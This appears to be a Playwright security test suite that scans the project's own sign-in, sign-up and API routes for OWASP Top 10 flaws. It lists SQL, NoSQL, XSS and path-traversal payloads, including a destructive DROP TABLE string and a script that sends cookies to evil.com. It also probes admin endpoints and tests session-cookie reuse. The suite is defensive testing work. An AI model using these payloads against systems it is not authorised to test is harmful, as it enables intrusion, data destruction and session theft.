/**
 * ðŸ” Vulnerability Assessment Suite
 * OWASP Top 10 and authentication-specific vulnerability testing
 */

import { test, expect, Page } from '@playwright/test'
import crypto from 'crypto'

interface VulnerabilityTest {
  id: string
  category: string
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'
  description: string
  cweId?: string
  owaspCategory?: string
}

class VulnerabilityScanner {
  private findings: VulnerabilityTest[] = []

  addFinding(finding: VulnerabilityTest) {
    this.findings.push(finding)
  }

  getFindings(): VulnerabilityTest[] {
    return [...this.findings]
  }

  getCriticalFindings(): VulnerabilityTest[] {
    return this.findings.filter(f => f.severity === 'CRITICAL')
  }

  getHighFindings(): VulnerabilityTest[] {
    return this.findings.filter(f => f.severity === 'HIGH')
  }

  clear() {
    this.findings = []
  }

  generateReport() {
    const severityCounts = {
      CRITICAL: this.findings.filter(f => f.severity === 'CRITICAL').length,
      HIGH: this.findings.filter(f => f.severity === 'HIGH').length,
      MEDIUM: this.findings.filter(f => f.severity === 'MEDIUM').length,
      LOW: this.findings.filter(f => f.severity === 'LOW').length
    }

    const categories = [...new Set(this.findings.map(f => f.category))]

    return {
      summary: {
        totalFindings: this.findings.length,
        criticalFindings: severityCounts.CRITICAL,
        highFindings: severityCounts.HIGH,
        mediumFindings: severityCounts.MEDIUM,
        lowFindings: severityCounts.LOW
      },
      categories,
      findings: this.findings,
      riskScore: this.calculateRiskScore(),
      recommendations: this.generateRecommendations()
    }
  }

  private calculateRiskScore(): number {
    const weights = { CRITICAL: 10, HIGH: 7, MEDIUM: 4, LOW: 1 }
    const totalScore = this.findings.reduce((score, finding) => {
      return score + weights[finding.severity]
    }, 0)
    
    // Normalize to 0-100 scale
    return Math.min(100, totalScore)
  }

  private generateRecommendations(): string[] {
    const recommendations = []
    
    if (this.getCriticalFindings().length > 0) {
      recommendations.push('URGENT: Address all critical vulnerabilities immediately')
    }
    
    if (this.getHighFindings().length > 0) {
      recommendations.push('Address high-severity vulnerabilities within 24-48 hours')
    }
    
    const authFindings = this.findings.filter(f => f.category === 'Authentication')
    if (authFindings.length > 0) {
      recommendations.push('Review authentication implementation and security controls')
    }
    
    const injectionFindings = this.findings.filter(f => f.category === 'Injection')
    if (injectionFindings.length > 0) {
      recommendations.push('Implement input validation and parameterized queries')
    }
    
    return recommendations
  }
}

const TEST_CONFIG = {
  baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000',
  testUser: {
    email: 'vuln-test@faddlmatch.com',
    password: 'VulnTest123!',
    firstName: 'Vulnerability',
    lastName: 'Test'
  }
}

const scanner = new VulnerabilityScanner()

test.describe('OWASP Top 10 - Injection Attacks', () => {
  test.beforeEach(() => {
    scanner.clear()
  })

  test('should test for SQL injection vulnerabilities', async ({ page }) => {
    await page.goto(`${TEST_CONFIG.baseUrl}/sign-in`)

    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "') OR '1'='1",
      "' OR 'a'='a",
      "' OR EXISTS(SELECT * FROM users) --",
      "1' ORDER BY 1 --"
    ]

    for (const payload of sqlPayloads) {
      // Test in email field
      await page.fill('input[name="emailAddress"]', payload)
      await page.fill('input[name="password"]', 'testpassword')
      
      const response = page.waitForResponse(/sign-in|api/)
      await page.click('button[type="submit"]')
      
      try {
        const resp = await response
        
        // Check for SQL error messages that might indicate vulnerability
        const responseText = await resp.text()
        
        if (responseText.includes('SQL') || 
            responseText.includes('syntax error') || 
            responseText.includes('mysql') || 
            responseText.includes('postgres') ||
            responseText.includes('ORA-') ||
            resp.status() === 500) {
          
          scanner.addFinding({
            id: `SQL_INJ_001_${payload}`,
            category: 'Injection',
            severity: 'CRITICAL',
            description: `Potential SQL injection vulnerability detected with payload: ${payload}`,
            cweId: 'CWE-89',
            owaspCategory: 'A03:2021 â€“ Injection'
          })
        }
      } catch (error) {
        // Network error might indicate successful injection
        if (error.message.includes('timeout') || error.message.includes('connection')) {
          scanner.addFinding({
            id: `SQL_INJ_002_${payload}`,
            category: 'Injection',
            severity: 'HIGH',
            description: `Network error with SQL injection payload might indicate vulnerability: ${payload}`,
            cweId: 'CWE-89',
            owaspCategory: 'A03:2021 â€“ Injection'
          })
        }
      }
      
      // Clear fields for next test
      await page.fill('input[name="emailAddress"]', '')
      await page.fill('input[name="password"]', '')
    }

    // Verify no critical SQL injection vulnerabilities
    const criticalInjections = scanner.getCriticalFindings().filter(f => f.category === 'Injection')
    expect(criticalInjections.length).toBe(0)
  })

  test('should test for NoSQL injection vulnerabilities', async ({ page }) => {
    await page.goto(`${TEST_CONFIG.baseUrl}/sign-in`)

    const noSqlPayloads = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$regex":".*"}',
      '{"$where":"1==1"}',
      '{"$exists":true}',
      '{"$or":[{},{"a":"a"}]}',
      'true, $where: "1 == 1"'
    ]

    for (const payload of noSqlPayloads) {
      await page.fill('input[name="emailAddress"]', payload)
      await page.fill('input[name="password"]', 'testpassword')
      
      try {
        const response = page.waitForResponse(/sign-in|api/)
        await page.click('button[type="submit"]')
        
        const resp = await response
        const responseText = await resp.text()
        
        // Check for MongoDB or NoSQL error messages
        if (responseText.includes('mongo') || 
            responseText.includes('$') ||
            responseText.includes('ObjectId') ||
            resp.status() === 500) {
          
          scanner.addFinding({
            id: `NOSQL_INJ_001_${payload}`,
            category: 'Injection',
            severity: 'HIGH',
            description: `Potential NoSQL injection vulnerability: ${payload}`,
            cweId: 'CWE-943',
            owaspCategory: 'A03:2021 â€“ Injection'
          })
        }
      } catch (error) {
        // Log for analysis but don't fail test
        console.log(`NoSQL injection test error with payload ${payload}:`, error.message)
      }
      
      await page.fill('input[name="emailAddress"]', '')
      await page.fill('input[name="password"]', '')
    }
  })

  test('should test for XSS vulnerabilities', async ({ page }) => {
    await page.goto(`${TEST_CONFIG.baseUrl}/sign-up`)

    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
      'javascript:alert("xss")',
      '<iframe src="javascript:alert(\'xss\')">',
      '<body onload=alert("xss")>',
      '<div onclick=alert("xss")>click</div>',
      '"><script>alert("xss")</script>',
      '\';alert("xss");//',
      '<script>document.location="http://evil.com/"+document.cookie</script>'
    ]

    for (const payload of xssPayloads) {
      // Test XSS in first name field
      await page.fill('input[name="firstName"]', payload)
      await page.fill('input[name="lastName"]', 'Test')
      await page.fill('input[name="emailAddress"]', `xss-test-${Date.now()}@example.com`)
      await page.fill('input[name="password"]', 'XssTest123!')
      
      // Listen for JavaScript dialogs (alert, confirm, prompt)
      let dialogTriggered = false
      page.on('dialog', async dialog => {
        dialogTriggered = true
        await dialog.accept()
        
        scanner.addFinding({
          id: `XSS_001_${payload}`,
          category: 'Cross-Site Scripting',
          severity: 'HIGH',
          description: `XSS vulnerability detected - JavaScript executed: ${payload}`,
          cweId: 'CWE-79',
          owaspCategory: 'A03:2021 â€“ Injection'
        })
      })
      
      await page.click('button[type="submit"]')
      
      // Wait a moment to see if dialog appears
      await page.waitForTimeout(1000)
      
      // Check if payload appears unescaped in DOM
      const pageContent = await page.content()
      if (pageContent.includes(payload) && 
          (pageContent.includes('<script>') || pageContent.includes('onerror='))) {
        
        scanner.addFinding({
          id: `XSS_002_${payload}`,
          category: 'Cross-Site Scripting',
          severity: 'MEDIUM',
          description: `Potential XSS - unescaped payload in DOM: ${payload}`,
          cweId: 'CWE-79',
          owaspCategory: 'A03:2021 â€“ Injection'
        })
      }
      
      // Clear form for next test
      await page.fill('input[name="firstName"]', '')
      await page.fill('input[name="lastName"]', '')
      await page.fill('input[name="emailAddress"]', '')
      await page.fill('input[name="password"]', '')
    }

    // Verify no high-severity XSS vulnerabilities
    const xssFindings = scanner.getFindings().filter(f => f.category === 'Cross-Site Scripting')
    const highSeverityXss = xssFindings.filter(f => f.severity === 'HIGH')
    expect(highSeverityXss.length).toBe(0)
  })
})

test.describe('OWASP Top 10 - Broken Authentication', () => {
  test('should test for authentication bypass vulnerabilities', async ({ page }) => {
    // Test various authentication bypass techniques
    const bypassAttempts = [
      {
        method: 'SQL injection bypass',
        email: "admin'--",
        password: 'anything'
      },
      {
        method: 'Always true condition',
        email: "' OR '1'='1' --",
        password: 'anything'
      },
      {
        method: 'Comment injection',
        email: 'admin/*',
        password: 'anything'
      }
    ]

    for (const attempt of bypassAttempts) {
      await page.goto(`${TEST_CONFIG.baseUrl}/sign-in`)
      
      await page.fill('input[name="emailAddress"]', attempt.email)
      await page.fill('input[name="password"]', attempt.password)
      await page.click('button[type="submit"]')
      
      // Wait for potential redirect or error
      await page.waitForTimeout(2000)
      
      // Check if bypass was successful (should NOT be)
      const currentUrl = page.url()
      if (currentUrl.includes('dashboard') || currentUrl.includes('matches')) {
        scanner.addFinding({
          id: `AUTH_BYPASS_001_${attempt.method}`,
          category: 'Authentication',
          severity: 'CRITICAL',
          description: `Authentication bypass vulnerability: ${attempt.method}`,
          cweId: 'CWE-287',
          owaspCategory: 'A07:2021 â€“ Identification and Authentication Failures'
        })
      }
    }
  })

  test('should test for session fixation vulnerabilities', async ({ browser }) => {
    const context1 = await browser.newContext()
    const context2 = await browser.newContext()
    
    try {
      const page1 = await context1.newPage()
      const page2 = await context2.newPage()
      
      // User 1 gets a session
      await page1.goto(`${TEST_CONFIG.baseUrl}/sign-in`)
      const cookies1 = await context1.cookies()
      const sessionCookie1 = cookies1.find(c => c.name.includes('session') || c.name.includes('clerk'))
      
      if (sessionCookie1) {
        // User 2 tries to use User 1's session cookie
        await context2.addCookies([sessionCookie1])
        await page2.goto(`${TEST_CONFIG.baseUrl}/dashboard`)
        
        // Check if User 2 can access protected content with User 1's session
        const isAuthenticated = await page2.locator('[data-testid="user-menu"], .user-menu').count() > 0
        
        if (isAuthenticated) {
          scanner.addFinding({
            id: 'SESSION_FIXATION_001',
            category: 'Authentication',
            severity: 'HIGH',
            description: 'Session fixation vulnerability detected',
            cweId: 'CWE-384',
            owaspCategory: 'A07:2021 â€“ Identification and Authentication Failures'
          })
        }
      }
    } finally {
      await context1.close()
      await context2.close()
    }
  })

  test('should test for weak password policies', async ({ page }) => {
    await page.goto(`${TEST_CONFIG.baseUrl}/sign-up`)

    const weakPasswords = [
      'password',
      '123456',
      'qwerty',
      'abc123',
      'password123',
      'admin',
      'letmein',
      'welcome',
      '1234567890',
      'Pa$$w0rd' // Common pattern but potentially weak
    ]

    for (const password of weakPasswords) {
      await page.fill('input[name="emailAddress"]', `weak-test-${Date.now()}@example.com`)
      await page.fill('input[name="password"]', password)
      await page.fill('input[name="firstName"]', 'Weak')
      await page.fill('input[name="lastName"]', 'Password')
      
      await page.click('button[type="submit"]')
      
      // Check if weak password was accepted
      await page.waitForTimeout(1000)
      
      const currentUrl = page.url()
      if (currentUrl.includes('verify-email') || currentUrl.includes('onboarding')) {
        scanner.addFinding({
          id: `WEAK_PASSWORD_001_${password}`,
          category: 'Authentication',
          severity: 'MEDIUM',
          description: `Weak password accepted: ${password}`,
          cweId: 'CWE-521',
          owaspCategory: 'A07:2021 â€“ Identification and Authentication Failures'
        })
      }
      
      // Reset form
      await page.goto(`${TEST_CONFIG.baseUrl}/sign-up`)
    }
  })
})

test.describe('OWASP Top 10 - Security Misconfiguration', () => {
  test('should test for information disclosure in error messages', async ({ page }) => {
    // Test various endpoints for verbose error messages
    const testEndpoints = [
      '/api/nonexistent',
      '/api/user/12345',
      '/api/admin',
      '/api/debug',
      '/api/../../../etc/passwd',
      '/api/user/%00',
      '/api/user/\x00'
    ]

    for (const endpoint of testEndpoints) {
      try {
        const response = await page.request.get(`${TEST_CONFIG.baseUrl}${endpoint}`)
        const responseText = await response.text()
        
        // Check for information disclosure
        const sensitivePatterns = [
          /stack trace/i,
          /internal server error/i,
          /sql error/i,
          /database/i,
          /connection string/i,
          /password/i,
          /secret/i,
          /token/i,
          /file not found/i,
          /directory/i,
          /path/i,
          /server version/i
        ]

        for (const pattern of sensitivePatterns) {
          if (pattern.test(responseText)) {
            scanner.addFinding({
              id: `INFO_DISCLOSURE_001_${endpoint}`,
              category: 'Information Disclosure',
              severity: 'MEDIUM',
              description: `Information disclosure in error message at ${endpoint}`,
              cweId: 'CWE-209',
              owaspCategory: 'A05:2021 â€“ Security Misconfiguration'
            })
            break
          }
        }
      } catch (error) {
        // Log error but continue testing
        console.log(`Error testing endpoint ${endpoint}:`, error.message)
      }
    }
  })

  test('should test for missing security headers', async ({ page }) => {
    const response = await page.request.get(TEST_CONFIG.baseUrl)
    const headers = response.headers()
    
    const requiredSecurityHeaders = [
      { name: 'x-content-type-options', expected: 'nosniff' },
      { name: 'x-frame-options', expected: /deny|sameorigin/i },
      { name: 'x-xss-protection', expected: /1/ },
      { name: 'content-security-policy', expected: /.+/ },
      { name: 'strict-transport-security', expected: /.+/ }, // In production
      { name: 'referrer-policy', expected: /.+/ }
    ]

    for (const header of requiredSecurityHeaders) {
      const headerValue = headers[header.name]
      
      if (!headerValue) {
        scanner.addFinding({
          id: `MISSING_HEADER_001_${header.name}`,
          category: 'Security Misconfiguration',
          severity: 'MEDIUM',
          description: `Missing security header: ${header.name}`,
          cweId: 'CWE-1021',
          owaspCategory: 'A05:2021 â€“ Security Misconfiguration'
        })
      } else if (!header.expected.test(headerValue)) {
        scanner.addFinding({
          id: `WEAK_HEADER_001_${header.name}`,
          category: 'Security Misconfiguration',
          severity: 'LOW',
          description: `Weak security header value: ${header.name}=${headerValue}`,
          cweId: 'CWE-1021',
          owaspCategory: 'A05:2021 â€“ Security Misconfiguration'
        })
      }
    }
  })

  test('should test for directory traversal vulnerabilities', async ({ page }) => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc//passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ]

    for (const payload of traversalPayloads) {
      try {
        const response = await page.request.get(`${TEST_CONFIG.baseUrl}/api/file/${payload}`)
        const responseText = await response.text()
        
        // Check for signs of successful directory traversal
        if (responseText.includes('root:') || 
            responseText.includes('daemon:') ||
            responseText.includes('# Copyright') ||
            responseText.includes('[boot loader]')) {
          
          scanner.addFinding({
            id: `DIR_TRAVERSAL_001_${payload}`,
            category: 'Directory Traversal',
            severity: 'CRITICAL',
            description: `Directory traversal vulnerability: ${payload}`,
            cweId: 'CWE-22',
            owaspCategory: 'A01:2021 â€“ Broken Access Control'
          })
        }
      } catch (error) {
        // Expected for non-existent endpoints
      }
    }
  })
})

test.describe('OWASP Top 10 - Broken Access Control', () => {
  test('should test for horizontal privilege escalation', async ({ browser }) => {
    // This test would require two different user accounts
    // For now, we'll simulate the test structure
    
    const context1 = await browser.newContext()
    const context2 = await browser.newContext()
    
    try {
      const page1 = await context1.newPage()
      const page2 = await context2.newPage()
      
      // Simulate user 1 accessing user 2's data
      const testEndpoints = [
        '/api/user/other-user-id/profile',
        '/api/user/12345/messages',
        '/api/user/67890/matches',
        '/api/guardian/other-user-id/permissions'
      ]
      
      for (const endpoint of testEndpoints) {
        try {
          const response = await page1.request.get(`${TEST_CONFIG.baseUrl}${endpoint}`)
          
          if (response.status() === 200) {
            scanner.addFinding({
              id: `HORIZ_PRIV_ESC_001_${endpoint}`,
              category: 'Access Control',
              severity: 'HIGH',
              description: `Potential horizontal privilege escalation: ${endpoint}`,
              cweId: 'CWE-639',
              owaspCategory: 'A01:2021 â€“ Broken Access Control'
            })
          }
        } catch (error) {
          // Expected for proper access control
        }
      }
    } finally {
      await context1.close()
      await context2.close()
    }
  })

  test('should test for vertical privilege escalation', async ({ page }) => {
    // Test accessing admin endpoints without admin privileges
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/system',
      '/api/admin/config',
      '/admin',
      '/admin/dashboard',
      '/api/debug',
      '/api/internal'
    ]

    for (const endpoint of adminEndpoints) {
      try {
        const response = await page.request.get(`${TEST_CONFIG.baseUrl}${endpoint}`)
        
        if (response.status() === 200) {
          const responseText = await response.text()
          
          // Check if admin content is accessible
          if (responseText.includes('admin') || 
              responseText.includes('system') ||
              responseText.includes('config') ||
              responseText.includes('debug')) {
            
            scanner.addFinding({
              id: `VERT_PRIV_ESC_001_${endpoint}`,
              category: 'Access Control',
              severity: 'CRITICAL',
              description: `Vertical privilege escalation vulnerability: ${endpoint}`,
              cweId: 'CWE-863',
              owaspCategory: 'A01:2021 â€“ Broken Access Control'
            })
          }
        }
      } catch (error) {
        // Expected for proper access control
      }
    }
  })
})

test.describe('Vulnerability Assessment Summary', () => {
  test('should generate comprehensive vulnerability report', async () => {
    const report = scanner.generateReport()
    
    console.log('ðŸ” Vulnerability Assessment Report:')
    console.log('=====================================')
    console.log(JSON.stringify(report, null, 2))
    
    // Security assertions
    expect(report.summary.criticalFindings).toBe(0)
    expect(report.summary.highFindings).toBeLessThan(3)
    expect(report.riskScore).toBeLessThan(20)
    
    // Log recommendations
    if (report.recommendations.length > 0) {
      console.log('\nðŸ› ï¸ Security Recommendations:')
      report.recommendations.forEach((rec, index) => {
        console.log(`${index + 1}. ${rec}`)
      })
    }
    
    // Generate security score
    const securityScore = Math.max(0, 100 - report.riskScore)
    console.log(`\nðŸ”’ Overall Security Score: ${securityScore}/100`)
    
    expect(securityScore).toBeGreaterThan(80) // Minimum 80% security score
  })
})